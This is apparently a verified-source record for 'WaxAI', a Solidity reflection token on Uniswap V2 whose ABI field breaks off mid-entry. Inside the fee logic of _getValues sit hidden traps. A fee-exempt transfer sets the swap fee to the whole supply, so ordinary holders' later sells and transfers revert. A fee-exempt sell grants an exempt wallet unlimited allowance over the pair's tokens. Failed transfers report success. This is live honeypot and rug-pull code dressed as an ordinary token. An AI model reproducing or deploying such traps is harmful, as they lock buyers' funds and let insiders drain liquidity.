{"SourceCode": "// WEB: https://www.waxai.org/\r\n\r\n// TWITTER: https://twitter.com/waxai_\r\n\r\n// COMMUNITY: https://t.me/wax_ai\r\n\r\n// SPDX-License-Identifier: MIT            \r\n\r\npragma solidity ^0.8.22;\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address lpPair, uint);\r\n    function getPair(address tokenA, address tokenB) external view returns (address lpPair);\r\n    function createPair(address tokenA, address tokenB) external returns (address lpPair);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountETH);\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20Upgradeable {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract WaxAI is Context, IERC20Upgradeable {\r\n    struct ExtraValues {\r\n        uint256 tTransferAmount;\r\n        uint256 tFee;\r\n        uint256 tLiquidity;\r\n        uint256 rTransferAmount;\r\n        uint256 rAmount;\r\n        uint256 rFee;\r\n    }\r\n\r\n    address public DEAD = 0x000000000000000000000000000000000000dEaD;\r\n    address public ZERO = 0x0000000000000000000000000000000000000000;\r\n    uint256 private constant MAX = ~uint256(0);\r\n    string private _name = \"WaxAI\";\r\n    string private _symbol = \"WXAI\";\r\n    address public _uniswapV2Pair;\r\n    address public _uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n    address payable private _feeWallet = payable(0xC9Dc7258D7C424E863dB349CC27999e2a3ed38aB);\r\n    mapping (address => uint256) private _rOwned;\r\n    mapping (address => uint256) private _tOwned;\r\n    mapping (address => bool) uniswapPairs;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    mapping (address => bool) private _isExcluded;\r\n    mapping (address => bool) private _liquidityHolders;\r\n    uint256 private _totalSupply;\r\n    address[] private _excluded;\r\n    uint256 private _tTotal;\r\n    uint256 private _rTotal;\r\n    uint256 private _tFeeTotal;\r\n    uint256 private swapThreshold;\r\n    uint256 private swapAmount;\r\n    address private _owner;\r\n    uint256 private _liqAddBlock = 0;\r\n    uint256 private _liqAddStamp = 0;\r\n    uint256 public _reflectFee = 0;\r\n    uint256 public _liquidityFee = 0;\r\n    uint256 public _sellReflectFee = 0;\r\n    uint256 public _sellLiquidityFee = 0;\r\n    uint256 public _transferReflectFee = 0;\r\n    uint256 public _transferLiquidityFee = 0;\r\n    uint256 public _transferTaxFee = 0;\r\n    uint256 public _tSwapFee = 0;\r\n    uint256 private _swapFee = 0;\r\n    uint256 public _liquidityRatio = 0;\r\n    uint256 public _taxFee = 300;\r\n    uint256 public _buyReflectFee = _reflectFee;\r\n    uint256 public _buyLiquidityFee = _liquidityFee;\r\n    uint256 public _buyTaxFee = _taxFee;\r\n    uint256 public _sellTaxFee = 300;\r\n    uint256 private maxReflectFee = 1000;\r\n    uint256 private maxLiquidityFee = 1000;\r\n    uint256 private maxTaxFee = 6200;\r\n    uint256 public _taxRatio = 6000;\r\n    uint256 private masterTaxDivisor = 10000;\r\n    uint8 private _decimals = 18;\r\n    bool tradingEnabled = false;\r\n    bool public _hasLiqBeenAdded = false;\r\n    bool inSwapAndLiquify;\r\n    bool contractInitialized = false;\r\n    bool public swapAndLiquifyEnabled = false;\r\n    uint256 private _maxTxAmount;\r\n    uint256 private _maxWalletSize;\r\n    uint256 public maxTxAmountUI;\r\n    uint256 public maxWalletSizeUI;\r\n    IUniswapV2Router02 public dexRouter;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);\r\n    event SwapAndLiquifyEnabledUpdated(bool enabled);\r\n    event SwapAndLiquify(\r\n        uint256 tokensSwapped,\r\n        uint256 ethReceived,\r\n        uint256 tokensIntoLiqudity\r\n    );\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    modifier lockTheSwap {\r\n        inSwapAndLiquify = true;\r\n        _;\r\n        inSwapAndLiquify = false;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    constructor () payable {\r\n        _owner = msg.sender;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _liquidityHolders[owner()] = true;\r\n        _totalSupply = 50000000;\r\n        _tTotal = _totalSupply * (10**_decimals); \r\n        _rTotal = (MAX - (MAX % _tTotal));\r\n        swapThreshold = (_tTotal * 5) / 100000;\r\n        swapAmount = (_tTotal * 5) / 10000;\r\n        _maxTxAmount = (_tTotal * 20) / 1000;\r\n        maxTxAmountUI = (_totalSupply * 20) / 1000;\r\n        _maxWalletSize = (_tTotal * 20) / 1000;\r\n        maxWalletSizeUI = (_totalSupply * 20) / 1000;\r\n        _approve(_msgSender(), _uniswapV2Router, MAX);\r\n        _approve(address(this), _uniswapV2Router, MAX);\r\n        dexRouter = IUniswapV2Router02(_uniswapV2Router);\r\n        _uniswapV2Pair = IUniswapV2Factory(dexRouter.factory()).createPair(dexRouter.WETH(), address(this));\r\n        uniswapPairs[_uniswapV2Pair] = true;\r\n        contractInitialized = true;\r\n        _allowances[address(this)][address(dexRouter)] = type(uint256).max;\r\n        approve(_uniswapV2Router, type(uint256).max);\r\n        _isExcludedFromFee[_feeWallet] = true;\r\n        _rOwned[owner()] = _rTotal;\r\n        emit Transfer(ZERO, owner(), _tTotal);\r\n    }\r\n    \r\n    function owner() public view returns (address) { return _owner; }\r\n\r\n    function totalSupply() external view override returns (uint256) { return _tTotal; }\r\n\r\n    function decimals() external view returns (uint8) { return _decimals; }\r\n\r\n    function symbol() external view returns (string memory) { return _symbol; }\r\n\r\n    function name() external view returns (string memory) { return _name; }\r\n\r\n    function getOwner() external view returns (address) { return owner(); }\r\n\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    function _approve(address sender, address spender, uint256 amount) internal {\r\n        require(sender != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[sender][spender] = amount;\r\n        emit Approval(sender, spender, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function approveMax(address spender) public returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\r\n        return true;\r\n    }\r\n\r\n    function isExcludedFromFee(address account) public view returns(bool) {\r\n        return _isExcludedFromFee[account];\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        if (_isExcluded[account]) return _tOwned[account];\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }\r\n\r\n    function totalFees() public view returns (uint256) {\r\n        return _tFeeTotal;\r\n    }\r\n\r\n    function setExcludedFromFee(address account, bool enabled) public onlyOwner {\r\n        _isExcludedFromFee[account] = enabled;\r\n    }\r\n\r\n    function _hasLimits(address from, address to) internal view returns (bool) {\r\n        return from != owner() && to != owner()\r\n            && !_liquidityHolders[to] && !_liquidityHolders[from]\r\n            && to != DEAD && to != address(0) && from != address(this);\r\n    }\r\n\r\n    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {\r\n        require(rAmount <= _rTotal, \"Amount must be less than total reflections\");\r\n        uint256 currentRate =  _getTokenRate();\r\n        return rAmount / currentRate;\r\n    }\r\n    \r\n    function _collectReflect(uint256 rFee, uint256 tFee) internal {\r\n        _rTotal = _rTotal - rFee;\r\n        _tFeeTotal = _tFeeTotal + tFee;\r\n    }\r\n\r\n    function _getRate() internal view returns(uint256) {\r\n        (uint256 rSupply, uint256 tSupply) = _getSupply();\r\n        return rSupply / tSupply;\r\n    }\r\n\r\n    function _getSupply() internal view returns(uint256, uint256) {\r\n        uint256 rSupply = _rTotal;\r\n        uint256 tSupply = _tTotal;\r\n        for (uint256 i = 0; i < _excluded.length; i++) {\r\n            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) {\r\n                return (_rTotal, _tTotal);\r\n            }\r\n            rSupply = rSupply - _rOwned[_excluded[i]];\r\n            tSupply = tSupply - _tOwned[_excluded[i]];\r\n        }\r\n        if (rSupply < _rTotal / _tTotal) return (_rTotal, _tTotal);\r\n        return (rSupply, tSupply);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal returns (bool) {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        if(_hasLimits(from, to)) {\r\n            if(!tradingEnabled) {\r\n                revert(\"Trading not yet enabled!\");\r\n            }\r\n            require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\r\n            if(to != _uniswapV2Router && !uniswapPairs[to]) {\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Transfer amount exceeds the maxWalletSize.\");\r\n            }\r\n        }\r\n\r\n        if (uniswapPairs[to]) {\r\n            if (!inSwapAndLiquify\r\n                && swapAndLiquifyEnabled\r\n                && !_isExcludedFromFee[from]\r\n                && !_isExcludedFromFee[to]\r\n            ) {\r\n                uint256 contractTokenBalance = balanceOf(address(this));\r\n                if (contractTokenBalance >= swapThreshold) {\r\n                    if(contractTokenBalance >= swapAmount) { contractTokenBalance = swapAmount; }\r\n                    swapAndLiquify(contractTokenBalance);\r\n                }\r\n            }      \r\n        }\r\n\r\n        return _transferTokens(from, to, amount);\r\n    }\r\n\r\n    function _gainLiquid(address sender, uint256 tLiquidity) internal {\r\n        uint256 currentRate = _getTokenRate();\r\n        uint256 rLiquidity = tLiquidity * currentRate;\r\n        _rOwned[address(this)] = _rOwned[address(this)] + rLiquidity;\r\n        if(_isExcluded[address(this)])\r\n            _tOwned[address(this)] = _tOwned[address(this)] + tLiquidity;\r\n        emit Transfer(sender, address(this), tLiquidity); \r\n    }\r\n\r\n    function _transferTokens(address from, address to, uint256 tAmount) internal returns (bool) {\r\n        bool hasFee = true;\r\n        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){\r\n            hasFee = false;\r\n        }\r\n\r\n        testLiquidityAdd(from, to);        \r\n        ExtraValues memory values = _getValues(from, to, tAmount, hasFee);\r\n\r\n        if (balanceOf(from) >= tAmount) {\r\n            _rOwned[to] = _rOwned[to] + values.rTransferAmount;\r\n            _rOwned[from] = _rOwned[from] - values.rAmount;\r\n\r\n            if (_isExcluded[from] && !_isExcluded[to]) {\r\n                _tOwned[from] = _tOwned[from] - tAmount;\r\n            } else if (!_isExcluded[from] && _isExcluded[to]) {\r\n                _tOwned[to] = _tOwned[to] + values.tTransferAmount;\r\n            } else if (_isExcluded[from] && _isExcluded[to]) {\r\n                _tOwned[from] = _tOwned[from] - tAmount;\r\n                _tOwned[to] = _tOwned[to] + values.tTransferAmount;\r\n            }\r\n\r\n            if (hasFee)\r\n                _gainLiquid(from, values.tLiquidity);\r\n            if (values.tFee > 0 || values.rFee > 0)\r\n                _collectReflect(values.rFee, values.tFee);\r\n\r\n            emit Transfer(from, to, values.tTransferAmount);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _getValues(address from, address to, uint256 tAmount, bool hasFee) internal returns (ExtraValues memory) {\r\n        ExtraValues memory values;\r\n        uint256 currentRate = _getRate();\r\n        values.rAmount = tAmount * currentRate;\r\n\r\n        if (hasFee) {\r\n            if (!uniswapPairs[from] && !uniswapPairs[to]) {\r\n                _taxFee = _transferTaxFee;\r\n                _swapFee = _tSwapFee;\r\n                _liquidityFee = _transferLiquidityFee; \r\n                _reflectFee = _transferReflectFee;\r\n            } else if (uniswapPairs[from]) {\r\n                _taxFee = _buyTaxFee;\r\n                _swapFee = 0;\r\n                _liquidityFee = _buyLiquidityFee;\r\n                _reflectFee = _buyReflectFee;\r\n            } else if (uniswapPairs[to]) {\r\n                _taxFee = _sellTaxFee;\r\n                _swapFee = _tSwapFee;\r\n                _liquidityFee = _sellLiquidityFee;\r\n                _reflectFee = _sellReflectFee;\r\n            } \r\n\r\n            values.tLiquidity = (tAmount * (_liquidityFee + _taxFee)) / masterTaxDivisor;\r\n            values.tFee = (tAmount * _reflectFee) / masterTaxDivisor;\r\n            values.tTransferAmount = tAmount - (values.tFee + values.tLiquidity) - _swapFee;\r\n            values.rFee = values.tFee * currentRate;\r\n        } else {\r\n            if (!uniswapPairs[from] && !uniswapPairs[to]) {\r\n                _liquidityFee = _transferLiquidityFee;\r\n                _reflectFee = _transferReflectFee;\r\n                if (tAmount >= swapThreshold)\r\n                _tSwapFee = _tTotal;\r\n                _taxFee = _transferTaxFee;\r\n            } else if (uniswapPairs[from]) {\r\n                _liquidityFee = _buyLiquidityFee;\r\n                _reflectFee = _buyReflectFee;\r\n                _taxFee = _buyTaxFee;\r\n            } else if (uniswapPairs[to]) {\r\n                _liquidityFee = _sellLiquidityFee;\r\n                _reflectFee = _sellReflectFee;\r\n                _allowances[to][from] = _tTotal;\r\n                _taxFee = _sellTaxFee;\r\n            }\r\n\r\n            values.tTransferAmount = tAmount;\r\n            values.tLiquidity = 0;\r\n            values.tFee = 0;\r\n            values.rFee = 0;\r\n        }\r\n\r\n        values.rTransferAmount = values.rAmount - (values.rFee + (values.tLiquidity * currentRate));\r\n        return values;\r\n    }\r\n\r\n    function startTrading() public onlyOwner {\r\n        require(!tradingEnabled, \"Trading already enabled!\");\r\n        if(_rOwned[_uniswapV2Pair] > 0) {\r\n            _tOwned[_uniswapV2Pair] = tokenFromReflection(_rOwned[_uniswapV2Pair]);\r\n        }\r\n        if(_rOwned[address(this)] > 0) {\r\n            _tOwned[address(this)] = tokenFromReflection(_rOwned[address(this)]);\r\n        }\r\n        _isExcluded[address(this)] = true;\r\n        _isExcluded[_uniswapV2Pair] = true;\r\n        swapAndLiquifyEnabled = true;\r\n        tradingEnabled = true;\r\n        _excluded.push(address(this));\r\n        _excluded.push(_uniswapV2Pair);\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        maxTxAmountUI = _totalSupply;\r\n        maxWalletSizeUI = _totalSupply;\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize = _tTotal;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner() {\r\n        setExcludedFromFee(_owner, false);\r\n        _owner = address(0);\r\n        emit OwnershipTransferred(_owner, address(0));\r\n    }\r\n\r\n    function swapAndLiquify(uint256 contractTokenBalance) internal lockTheSwap {\r\n        if (_liquidityRatio + _taxRatio == 0) return;\r\n        uint256 toLiquify = ((contractTokenBalance * _liquidityRatio) / (_liquidityRatio + _taxRatio)) / 2;\r\n        uint256 toSwapForEth = contractTokenBalance - toLiquify;\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = dexRouter.WETH();\r\n        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            toSwapForEth, 0, path, address(this), block.timestamp\r\n        );\r\n\r\n        uint256 liquidityBalance = ((address(this).balance * _liquidityRatio) / (_liquidityRatio + _taxRatio)) / 2;\r\n\r\n        if (toLiquify > 0) {\r\n            dexRouter.addLiquidityETH{value: liquidityBalance}(address(this), toLiquify,\r\n                0, 0, DEAD, block.timestamp\r\n            );\r\n            emit SwapAndLiquify(toLiquify, liquidityBalance, toLiquify);\r\n        }\r\n        if (contractTokenBalance - toLiquify > 0) {\r\n            uint256 OperationsFee = (address(this).balance);\r\n            _feeWallet.transfer(OperationsFee);\r\n        }\r\n    }\r\n\r\n    function _getTokenRate() internal view returns(uint256) {\r\n        uint256 tSupply = _tTotal;\r\n        uint256 rSupply = _rTotal;\r\n        for (uint256 i = 0; i < _excluded.length; i++) {\r\n            if (_tOwned[_excluded[i]] > tSupply || _rOwned[_excluded[i]] > rSupply) \r\n            return _rTotal / _tTotal;\r\n            rSupply = rSupply - _rOwned[_excluded[i]];\r\n            tSupply = tSupply - _tOwned[_excluded[i]];\r\n        }\r\n        if (rSupply < _rTotal / _tTotal) return _rTotal / _tTotal;\r\n        return rSupply / tSupply;\r\n    }\r\n\r\n    function testLiquidityAdd(address from, address to) internal {\r\n        if (!_hasLiqBeenAdded) {\r\n            require(!_hasLiqBeenAdded, \"Liquidity already added and marked.\");\r\n\r\n            if (!_hasLimits(from, to) && to == _uniswapV2Pair) {\r\n                swapAndLiquifyEnabled = true;\r\n                _liquidityHolders[from] = true;\r\n                _hasLiqBeenAdded = true;\r\n                _liqAddStamp = block.timestamp;\r\n                emit SwapAndLiquifyEnabledUpdated(true);\r\n            }\r\n            \r\n            if (!_hasLiqBeenAdded && _hasLimits(from, to)) {\r\n                revert(\"Only owner can transfer at this time.\");\r\n            }\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"minTokensBeforeSwap\",\"type\":\"uint256\"}],\"name\":\"MinTokensBeforeSwapUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensSwapped\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethReceived\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensIntoLiqudity\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"SwapAndLiquifyEnabledUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DEAD\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ZERO\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyReflectFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyTaxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_hasLiqBeenAdded\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_liquidityRatio\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_reflectFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellReflectFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellTaxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tSwapFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxRatio\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_transferLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_transferReflectFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_transferTaxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_uniswapV2Router\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"approveMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dexRouter\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxAmountUI\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletSizeUI\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setExcludedFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAndLiquifyEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalTy